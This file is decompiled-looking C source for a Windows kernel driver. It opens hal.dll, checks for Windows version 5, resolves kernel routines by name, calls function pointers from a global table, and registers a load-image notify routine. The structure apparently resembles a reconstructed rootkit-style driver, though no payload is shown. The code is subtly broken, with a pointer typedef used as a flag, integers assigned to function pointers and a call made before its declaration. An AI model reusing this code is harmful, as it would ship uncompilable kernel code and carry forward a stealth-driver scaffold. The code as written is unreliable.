
typedef unsigned char* BYTE;

BOOLEAN GetHaldllHandle() {
	UNICODE_STRING usString;
	ULONG var_8;
	HANDLE var_10 = NULL;
	BOOLEAN var_1 = FALSE;

	RtlInitUnicodeString(&usString, L"\\SystemRoot\\System32\\hal.dll");
	var_8 = 0;
	GetHandle(&usString, &var_10, &var_8);
	if (var_8 == 0) var_1 = TRUE;
	if (var_10 == NULL) return var_1;

	ZwClose(var_10);
	var_10 = 0;

	return var_1;
}


VOID GetHandle(PUNICODE_STRING usString, PHANDLE hHandle, PULONG a1) {
	NTSTATUS status;
	OBJECT_ATTRIBUTES oa;
	IO_STATUS_BLOCK ioBlock;

	if (*a1 != 0) return;
	*hHandle = 0;

	InitializeObjectAttributes(&oa, usString, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, NULL, NULL);
		status = ZwOpenFile(hHandle, 0x80100000, &oa, &ioBlock, FILE_SHARE_READ, 
			FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT);
		*a1 = status;
		return;
}


VOID RegisterImageCallback() {
	ULONG var_4, var_8;

	var_4 = 0;
	sub_10922(&var_8, &var_4);
	if (var_4 != 0) return;

	sub_1097A(&var_4);
	sub_10A7A();
	if (var_4 != 0) return;

	sub_109B6(&var_8);
	sub_105A8(&var_8);
	PsSetLoadImageNotifyRoutine(&NotifyRoutine);
	return;
}



NTSTATUS sub_10580() {
	BYTE var_1 = 0;
	NTSTATUS status = sub_104C8(&var_1);
	return status;
}


typedef INT(*fn_Int)(PULONG);
typedef INT(*fn_Void)();
NTSTATUS sub_104C8(BYTE* a1) {
	fn_Int fnCallInt;
	fn_Void fn_CallVoid;
	ULONG var_4, var_C;
	ULONG var_120[0x47];

	*a1 = 1;
	if (KeGetCurrentIrql() != PASSIVE_LEVEL) {
		*a1 = 0;
		return STATUS_SUCCESS;
	}

	sub_105A8(&var_4);
	if (Fxn_GetWindowsVersion(0) != 0 || Fxn_GetWindowsVersion(1) != 0) return STATUS_SUCCESS;
	
	Fxn_GetWindowsVersion(2);
	memset(&var_120, 0xFF, sizeof(var_120));
	if (var_4 == NULL)		return STATUS_UNSUCCESSFUL;

	fnCallInt = var_4;
	int ret = fnCallInt(&var_120);
	if (ret != 0x0) return STATUS_SUCCESS;

	var_4 = *(ULONG*)((ULONG_PTR)var_4 + 4);
	if (var_4 == NULL) return STATUS_UNSUCCESSFUL;

	fn_CallVoid = var_4;
	ret = fn_CallVoid();
	if (ret == NULL)	return STATUS_SUCCESS;

	*a1 = 0;
	return STATUS_SUCCESS;
}


extern ULONG byte_13E88;
ULONG sub_105A8(PULONG a1) {
	*a1 = 0;
	GetRoutinesAddress();
	sub_107DC();
	byte_13E88 = 0;
	*a1 = &dword_14128;
	return a1;
}

ULONG Fxn_GetWindowsVersion(ULONG a1) {
	ULONG var_4, var_8;

	var_4 = var_8 = 0;
	PsGetVersion(&var_4, &var_8, NULL, NULL);
	if (var_4 != 0x5) return 0;
	if (a1 != var_8) return 0;

	return 1;
}



extern ULONG dword_14128[2];
ULONG GetRoutinesAddress() {
	dword_14128[0] = 0;
	dword_14128[1] = 0;
	if (Fxn_GetWindowsVersion(0) == NULL)	return (&dword_14128);

	UNICODE_STRING usString;
	RtlInitUnicodeString(&usString, L"RtlGetVersion");
	dword_14128[0] = MmGetSystemRoutineAddress(&usString);
	
	RtlInitUnicodeString(&usString, L"KeAreAllApcsDisabled");
	dword_14128[1] = MmGetSystemRoutineAddress(&usString);

	return (&dword_14128);
}